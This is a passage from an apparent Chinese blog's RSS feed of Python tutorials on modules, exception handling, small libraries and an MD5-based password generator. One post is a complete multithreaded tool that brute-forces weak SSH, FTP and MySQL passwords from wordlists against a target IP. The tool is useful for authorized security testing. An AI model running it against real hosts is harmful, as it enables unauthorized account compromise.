  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/form_blast2.png&#34; alt=&#34;表单爆破2&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python的模块</title>
      <link>http://wyb0.com/posts/Python%E7%9A%84%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Wed, 31 Aug 2016 11:22:41 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E7%9A%84%E6%A8%A1%E5%9D%97/</guid>
      <description>

&lt;h2 id=&#34;python的模块:26b868add6f7b4d754432e2664208236&#34;&gt;Python的模块&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;在python中，任何一个python文件都可以看作一个模块&lt;/li&gt;
&lt;li&gt;不同包下有相同模块名并不会冲突，且包下必须有文件__init__.py&lt;/li&gt;
&lt;li&gt;from lib import * 意思是从包lib中导入所有模块(若lib为模块名则为导入模块的所有函数)&lt;/li&gt;
&lt;li&gt;from lib.module1 import test 意思是从lib这个包下的module1模块中导入函数test&lt;/li&gt;
&lt;li&gt;import导入模块时会从sys.path输出的结果路径中查找模块然后导入&lt;/li&gt;
&lt;li&gt;sys.path.append(&amp;rsquo;D:/xx/xx/xx/code&amp;rsquo;)可以添加搜索路径&lt;/li&gt;
&lt;li&gt;使用if __name__ == &amp;lsquo;__main__&amp;lsquo;:&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;实例:26b868add6f7b4d754432e2664208236&#34;&gt;实例&lt;/h2&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;文件结构如下

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/python_module_file_tree.png&#34; alt=&#34;模块目录结构.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;测试文件test.py&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

from package1 import * #导入包package1下的所有模块
import package2.module3 #导入包package2下的module3模块
import package2.module4 as s #导入包package2下的module4模块并重命名为s

a = module1.Class1() #创建一个对象
a.test() #调用类中的方法

b = module2.Class2()
b.test()

c = package2.module3.Class3()
c.test()

d = s.Class4()
d.test()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;包package1&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;init&lt;/strong&gt;.py&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#这个文件可以为空


__all__ = [&#39;module1&#39;, &#39;module2&#39;] #有这一句才能使用import *导入所有模块
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;module1.py&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-


&#39;this is test moudle&#39;


__author__ = &#39;reber&#39;


import sys


class Class1(object):
    &amp;quot;&amp;quot;&amp;quot;docstring for Class1&amp;quot;&amp;quot;&amp;quot;
    def __init__(self):
        super(Class1, self).__init__()


    def test(self):
        print &amp;quot;package1 -&amp;gt; module1.py -&amp;gt; Class1 -&amp;gt; test()&amp;quot;


    def main(self):
        print &amp;quot;this is module1.py main()&amp;quot;


if __name__ == &#39;__main__&#39;:
    sub11 = Class1()
    sub11.test()
    sub11.main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;module2.py&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-


&#39;this is test moudle&#39;


__author__ = &#39;reber&#39;


import sys


class Class2(object):
    &amp;quot;&amp;quot;&amp;quot;docstring for Class1&amp;quot;&amp;quot;&amp;quot;
    def __init__(self):
        super(Class2, self).__init__()


    def test(self):
        print &amp;quot;package1 -&amp;gt; module2.py -&amp;gt; Class2 -&amp;gt; test()&amp;quot;


    def main(self):
        print &amp;quot;this is module2.py main()&amp;quot;


if __name__ == &#39;__main__&#39;:
    sub11 = Class2()
    sub11.test()
    sub11.main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;包package2&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;init&lt;/strong&gt;.py&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;

__all__ = [&#39;module3&#39;, &#39;module4&#39;]
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;module3.py&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-


&#39;this is test moudle&#39;


__author__ = &#39;reber&#39;


import sys


class Class3(object):
    &amp;quot;&amp;quot;&amp;quot;docstring for Class1&amp;quot;&amp;quot;&amp;quot;
    def __init__(self):
        super(Class3, self).__init__()


    def test(self):
        print &amp;quot;package2 -&amp;gt; module3.py -&amp;gt; Class3 -&amp;gt; test()&amp;quot;


    def main(self):
        print &amp;quot;this is module3.py main()&amp;quot;


if __name__ == &#39;__main__&#39;:
    sub11 = Class3()
    sub11.test()
    sub11.main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
&lt;li&gt;module4.py&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-


&#39;this is test moudle&#39;


__author__ = &#39;reber&#39;


import sys


class Class4(object):
    &amp;quot;&amp;quot;&amp;quot;docstring for Class4&amp;quot;&amp;quot;&amp;quot;
    def __init__(self):
        super(Class4, self).__init__()


    def test(self):
        print &amp;quot;package2 -&amp;gt; module4.py -&amp;gt; Class4 -&amp;gt; test()&amp;quot;


    def main(self):
        print &amp;quot;this is module4.py main()&amp;quot;


if __name__ == &#39;__main__&#39;:
    sub11 = Class4()
    sub11.test()
    sub11.main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;执行python test.py结果

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/python_module_test_result.png&#34; alt=&#34;导入模块测试结果.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    
    <item>
      <title>Python实现密码生成器</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%99%A8/</link>
      <pubDate>Mon, 29 Aug 2016 15:14:57 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%AF%86%E7%A0%81%E7%94%9F%E6%88%90%E5%99%A8/</guid>
      <description>

&lt;h2 id=&#34;简介:c1145265751ca3eb267d557c37d78b56&#34;&gt;简介&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;有时候需要在网上注册许多账号，如果每个账户密码都一样的话，若被别人得知一个密码则所有账户就都沦陷了，若密码不一样则可能会忘记，在这里就用脚本写一个生成密码的工具，只需输入域名和账户名就可以根据key生成不一样的密码，也可以把域名和账户名写入文件，这样你用户名也可以不用记了。。。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;代码如下:c1145265751ca3eb267d557c37d78b56&#34;&gt;代码如下&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import hashlib
import sys
import os
import optparse
import json
import msvcrt

def get_md5(string):
    md5 = hashlib.md5()
    md5.update(string)
    s = md5.hexdigest()
    return s

def get_domain():
    if os.path.exists(&#39;account.txt&#39;):
        data = {}
        with open(&#39;account.txt&#39;, &#39;r&#39;) as f:
            lines = f.readlines()
            for line in lines:
                line = line.split(&#39;*&#39;)
                data[line[0]] = line[1].strip()
    else:
        pass
    return data

def get_pass():
    pwd = []
    while True:
        nchar = msvcrt.getch()
        if nchar in &#39;\r\n&#39;:
            print &#39;&#39;
            break
        elif nchar == &#39;\b&#39;: #&#39;\b&#39;是退格
            if pwd:
                del pwd[-1]
                sys.stdout.write(&#39;\b \b&#39;) #光标退格，输出一个空格，再退格
        else:
            pwd.append(nchar)
            sys.stdout.write(&#39;*&#39;)
    pwd = &#39;&#39;.join(pwd)
    return pwd

def main():
    if os.path.exists(&#39;account.txt&#39;):
        data = get_domain()
        parser = optparse.OptionParser()
        parser.add_option(&#39;-u&#39;, &#39;--url&#39;, dest=&#39;url&#39;,
                            default=None, type=&#39;string&#39;,
                            help=&#39;domain&#39;)
        parser.add_option(&#39;-l&#39;, &#39;--list&#39;, dest=&#39;List&#39;,
                            default=False, action=&#39;store_true&#39;,
                            help=&#39;show all domain and username&#39;)

        (options, args) = parser.parse_args()

        if options.url:
            domain = options.url
            ID = data[domain]
            print &amp;quot;Please input key: &amp;quot;,
            key = get_pass()

            mdomain = get_md5(domain)[0:8]
            mid = get_md5(ID)[8:24]
            mkey = get_md5(key)[16:32]
            pwd = mdomain + mid + mkey
            mpwd = get_md5(pwd)[8:24]
            print &amp;quot;\nDomain: %s\nName: %s\nPass: %s&amp;quot; % (domain,ID,mpwd)
        elif options.List:
            print json.dumps(data, indent=4)
        else:
            parser.print_help()
    else:
        if len(sys.argv) != 3:
            print &amp;quot;Usage: python account.py domain ID&amp;quot;
        else:
            domain = sys.argv[1]
            ID = sys.argv[2]
            print &amp;quot;Please input key: &amp;quot;,
            key = get_pass()

            mdomain = get_md5(domain)[0:8]
            mid = get_md5(ID)[8:24]
            mkey = get_md5(key)[16:32]
            pwd = mdomain + mid + mkey
            mpwd = get_md5(pwd)[8:24]
            print &amp;quot;\nDomain: %s\nName: %s\nPass: %s&amp;quot; % (domain,ID,mpwd)

main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;运行结果:c1145265751ca3eb267d557c37d78b56&#34;&gt;运行结果&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;可在脚本同文件夹下新建txt文件，内容形式如：baidu.com*wyb_9，站点域名和用户名以*分割

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/create_pwd_has_file.png&#34; alt=&#34;存在文件.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/create_pwd_no_file.png&#34; alt=&#34;不存在文件.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python实现多线程弱口令爆破</title>
      <link>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/</link>
      <pubDate>Fri, 26 Aug 2016 17:53:51 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E5%AE%9E%E7%8E%B0%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%BC%B1%E5%8F%A3%E4%BB%A4%E7%88%86%E7%A0%B4/</guid>
      <description>

&lt;h2 id=&#34;脚本:584a532418a1844143552a4b9dd71035&#34;&gt;脚本&lt;/h2&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

&#39;this script can bruter ftp/ssh/mysql&#39;

__author__ = &#39;reber&#39;

import Queue
import threading
import time
import logging
import socket
from optparse import OptionParser
import paramiko
from ftplib import FTP
import MySQLdb

#################公有类#################
class CommonFun(object):
    &amp;quot;&amp;quot;&amp;quot;docstring for CommonFun&amp;quot;&amp;quot;&amp;quot;
    def __init__(self):
        super(CommonFun, self).__init__()

    def set_log(self,lname):
        logger = logging.getLogger(lname)
        logger.setLevel(logging.DEBUG)

        ch = logging.StreamHandler()
        ch.setLevel(logging.DEBUG)

        formatter = logging.Formatter(&#39;%(asctime)s - %(name)s - %(levelname)s - %(message)s&#39;)
        ch.setFormatter(formatter)

        logger.addHandler(ch)

    def show_log(self, lname, msg):
        a = logging.getLogger(lname)
        a.debug(msg)

    def show_result(self, lname, rlist):
        if rlist:
            print &amp;quot;###################################################################&amp;quot;
            for x in rlist:
                self.show_log(lname,x)
        else:
            print &amp;quot;not found...&amp;quot;

#################SSH爆破模块#################
class SshBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for SshBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(SshBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        self.is_exit = False
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):        
        while not self.qlist.empty():
            if not self.is_exit:
                name,pwd = self.qlist.get().split(&#39;:&#39;)
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(hostname=self.host,port=22,username=name,password=pwd,timeout=self.timeout)
                    time.sleep(0.05)
                    ssh.close()
                    s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                    self.show_log(self.host,s)
                    self.result.append(s)
                except socket.timeout:
                    self.show_log(self.host,&amp;quot;Timeout...&amp;quot;)
                    self.qlist.put(name + &#39;:&#39; + pwd)
                    time.sleep(3)
                except Exception, e:
                    error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                    self.show_log(self.host,error)
                    pass
            else:
                break

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

#################FTP爆破模块#################
class FtpBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for FtpBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(FtpBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(&#39;:&#39;)
            try:
                ftp = FTP()
                ftp.connect(self.host, 21, self.timeout)
                ftp.login(name, pwd)
                time.sleep(0.05)
                ftp.quit()
                s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,&amp;quot;Timeout...&amp;quot;)
                self.qlist.put(name + &#39;:&#39; + pwd)
                time.sleep(1)
            except Exception, e:
                error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

#################MySQL爆破模块#################
class MysqlBruter(CommonFun):
    &amp;quot;&amp;quot;&amp;quot;docstring for MysqlBruter&amp;quot;&amp;quot;&amp;quot;
    def __init__(self, *args):
        super(MysqlBruter, self).__init__()
        (options,arg) = args
        self.host = options.host
        self.userfile = options.userfile
        self.passfile = options.passfile
        self.threadnum = options.threadnum
        self.timeout = options.timeout
        self.result = []
        self.set_log(self.host)
        self.qlist = Queue.Queue()
        print self.host,self.userfile,self.passfile,self.threadnum

    def get_queue(self):
        with open(self.userfile, &#39;r&#39;) as f:
            ulines = f.readlines()
        with open(self.passfile, &#39;r&#39;) as f:
            plines = f.readlines()

        for name in ulines:
            for pwd in plines:
                name = name.strip()
                pwd = pwd.strip()
                self.qlist.put(name + &#39;:&#39; + pwd)

    def thread(self):
        while not self.qlist.empty():
            name,pwd = self.qlist.get().split(&#39;:&#39;)
            try:
                conn = MySQLdb.connect(host=self.host, user=name, passwd=pwd, db=&#39;mysql&#39;, port=3306)
                if conn:
                    # time.sleep(0.05)
                    conn.close()
                s = &amp;quot;[OK] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,s)
                self.result.append(s)
            except socket.timeout:
                self.show_log(self.host,&amp;quot;Timeout&amp;quot;)
                self.qlist.put(name + &#39;:&#39; + pwd)
                time.sleep(3)
            except Exception, e:
                error = &amp;quot;[Error] %s:%s&amp;quot; % (name,pwd)
                self.show_log(self.host,error)
                pass

    def run(self):
        self.get_queue()
        starttime = time.time()

        threads = []
        for x in xrange(1,self.threadnum+1):
            t = threading.Thread(target=self.thread)
            threads.append(t)
            t.setDaemon(True) #主线程完成后不管子线程有没有结束，直接退出
            t.start()

        try:
            while True:
                if self.qlist.empty():
                    break
                else:
                    time.sleep(1)
        except KeyboardInterrupt:
            self.is_exit = True
            print &amp;quot;Exit the program...&amp;quot;
        print &amp;quot;Waiting...&amp;quot;
        time.sleep(5)

        self.show_result(self.host,self.result)
        finishetime = time.time()
        print &amp;quot;Used time: %f&amp;quot; % (finishetime-starttime)

def main():
    parser = OptionParser(usage=&#39;Usage: python %prog [options] type&#39;)
    parser.add_option(&#39;-i&#39;,&#39;--host&#39;,dest=&#39;host&#39;,help=&#39;target ip&#39;)
    parser.add_option(&#39;-o&#39;,&#39;--timeout&#39;,type=int,dest=&#39;timeout&#39;,default=5,help=&#39;timeout&#39;)
    parser.add_option(&#39;-t&#39;,&#39;--thread&#39;,type=int,dest=&#39;threadnum&#39;,default=10,help=&#39;threadnum&#39;)
    parser.add_option(&#39;-L&#39;,&#39;--userfile&#39;,dest=&#39;userfile&#39;,default=&#39;username.txt&#39;,help=&#39;userfile&#39;)
    parser.add_option(&#39;-P&#39;,&#39;--passfile&#39;,dest=&#39;passfile&#39;,default=&#39;password.txt&#39;,help=&#39;passfile&#39;)

    (options, args) = parser.parse_args()

    if not args:
        parser.print_help()
        exit()

    if args[0]==&#39;ssh&#39;:
        if options.host:
            ssh = SshBruter(options, args)
            ssh.run()
        else:
            parser.print_help()
    elif args[0]==&#39;ftp&#39;:
        if options.host:
            ftp = FtpBruter(options, args)
            ftp.run()
        else:
            parser.print_help()
    elif args[0]==&#39;mysql&#39;:
        if options.host:
            mysql = MysqlBruter(options, args)
            mysql.run()
        else:
            parser.print_help()
    else:
        print &amp;quot;type must be ssh or ftp or mysql&amp;quot;

if __name__ == &#39;__main__&#39;:
    main()
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;

&lt;h2 id=&#34;尝试爆破:584a532418a1844143552a4b9dd71035&#34;&gt;尝试爆破&lt;/h2&gt;

&lt;blockquote&gt;
&lt;p&gt;
&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_help.png&#34; alt=&#34;帮助信息.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_ssh.png&#34; alt=&#34;爆破SSH.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_ftp.png&#34; alt=&#34;爆破FTP.png&#34;&gt;
&lt;/div&gt;

&lt;br /&gt;&lt;br /&gt;

&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/bruter_mysql.png&#34; alt=&#34;爆破MySQL.png&#34;&gt;
&lt;/div&gt;
&lt;/p&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python的异常处理</title>
      <link>http://wyb0.com/posts/Python%E7%9A%84%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</link>
      <pubDate>Fri, 26 Aug 2016 10:40:44 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E7%9A%84%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/</guid>
      <description>

&lt;h3 id=&#34;0x00-python异常处理:5738ce3d8dfa8cfb2e11ff6b5f773746&#34;&gt;0x00 Python异常处理&lt;/h3&gt;

&lt;blockquote&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

try:
    try: # 可嵌套
        str(&amp;quot;aaaaa&amp;quot;)
        # int(&amp;quot;aaaaa&amp;quot;)
        # print a
        # print 1/0
    except (TypeError, IndexError, ValueError): #捕获多种异常
        print &amp;quot;TypeErrorZero or DivisionError or ValueError&amp;quot;
    except ZeroDivisionError as aa: #捕获除零错误
        print aa #输出详细错误信息
    except:
        print u&amp;quot;发生其他异常则执行这里&amp;quot;
    else:
        print u&amp;quot;上面没有出错才输出这里&amp;quot;
        a = [1,2,3]
        print a[4] #这里出错，会向上抛出错误，最终输出this is error
    finally:
        print u&amp;quot;不管是否出错都输出这里，一般用于释放资源，如关闭文件&amp;quot;
except Exception as e: #可捕获所有异常类型
    print &amp;quot;this is error&amp;quot;
    print e
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/python_exception_handling.png&#34; alt=&#34;python的异常处理.png&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;
</description>
    </item>
    
    <item>
      <title>Python的一些小模块</title>
      <link>http://wyb0.com/posts/Python%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%A8%A1%E5%9D%97/</link>
      <pubDate>Fri, 19 Aug 2016 19:42:14 +0800</pubDate>
      
      <guid>http://wyb0.com/posts/Python%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%A8%A1%E5%9D%97/</guid>
      <description>

&lt;h3 id=&#34;0x00-colorama:790dd5e6005cf75dbef05cf9a3332221&#34;&gt;0x00 colorama&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;这个模块可以输出带有颜色的字符&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
# -*- coding: utf-8 -*-

import colorama

colorama.init()

print &amp;quot;{f_color}{content}{g_color}&amp;quot;.format(f_color=colorama.Fore.CYAN,content=&#39;debug&#39;,g_color=colorama.Fore.RESET)
print &amp;quot;{f_color}{content}{g_color}&amp;quot;.format(f_color=colorama.Fore.YELLOW,content=&#39;warning&#39;,g_color=colorama.Fore.RESET)
print &amp;quot;{f_color}{content}{g_color}&amp;quot;.format(f_color=colorama.Fore.RED,content=&#39;error&#39;,g_color=colorama.Fore.RESET)
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/python_moudle_colorama.png&#34; alt=&#34;python的colorama模块&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x01-pyfiglet:790dd5e6005cf75dbef05cf9a3332221&#34;&gt;0x01 pyfiglet&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;可以输出字体的图片效果&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pyfiglet import figlet_format

print figlet_format(&amp;quot;reber&amp;quot;, font=&amp;quot;xtty&amp;quot;) #font可以控制输出的类型
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/python_moudle_pyfiglet.png&#34; alt=&#34;python的pyfiglet模块&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x02-chardet:790dd5e6005cf75dbef05cf9a3332221&#34;&gt;0x02 chardet&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;这个模块可以用来判断你的字符串(除了Unicode类型)是什么类型的编码&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;#!/usr/bin/env python
#-*- coding:utf-8 -*-

import chardet
import requests

resp = requests.get(&amp;quot;https://tower.im/users/sign_in&amp;quot;)
html = resp.content

if not isinstance(html,unicode):
    code = chardet.detect(html)
    print code #输出当前的编码方式
    
    #解码为unicode，然后编码为gbk
    str1 = html.decode(code[&#39;encoding&#39;]).encode(&#39;gbk&#39;)
    print chardet.detect(str1)

    start = str1.find(&#39;&amp;lt;title&amp;gt;&#39;)
    stop = str1.find(&#39;&amp;lt;/title&#39;)
    print str1[start+7:stop]
else:
    print u&amp;quot;编码是unicode.&amp;quot;
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/python_moudle_chardet.png&#34; alt=&#34;python的chardet模块&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x03-tqdm:790dd5e6005cf75dbef05cf9a3332221&#34;&gt;0x03 tqdm&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;进度条&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from tqdm import tqdm
import time

num = 233
for x in tqdm(xrange(1,num+1)):
    time.sleep(0.001)
&lt;/code&gt;&lt;/pre&gt;


&lt;div class=&#34;pure-u-1&#34;&gt;
  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/python_moudle_tqdm.png&#34; alt=&#34;python的tqdm模块&#34;&gt;
&lt;/div&gt;

&lt;/blockquote&gt;

&lt;h3 id=&#34;0x04-xpinyin:790dd5e6005cf75dbef05cf9a3332221&#34;&gt;0x04 xpinyin&lt;/h3&gt;

&lt;blockquote&gt;
&lt;p&gt;可以将汉字转化为拼音&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;gt;&amp;gt;&amp;gt; from xpinyin import Pinyin
&amp;gt;&amp;gt;&amp;gt; p = Pinyin()
&amp;gt;&amp;gt;&amp;gt; p.get_pinyin(u&#39;上海&#39;)
u&#39;shang-hai&#39;
&amp;gt;&amp;gt;&amp;gt; p.get_pinyin(u&#39;上海&#39;,&#39;&#39;)
u&#39;shanghai&#39;
&amp;gt;&amp;gt;&amp;gt; p.get_pinyin(u&#39;上海&#39;,&#39;:::&#39;)
u&#39;shang:::hai&#39;
&amp;gt;&amp;gt;&amp;gt; p.get_initials(u&#39;上海&#39;,&#39;&#39;)
u&#39;SH&#39;
&amp;gt;&amp;gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
</description>
    </item>
    
  </channel>
</rss>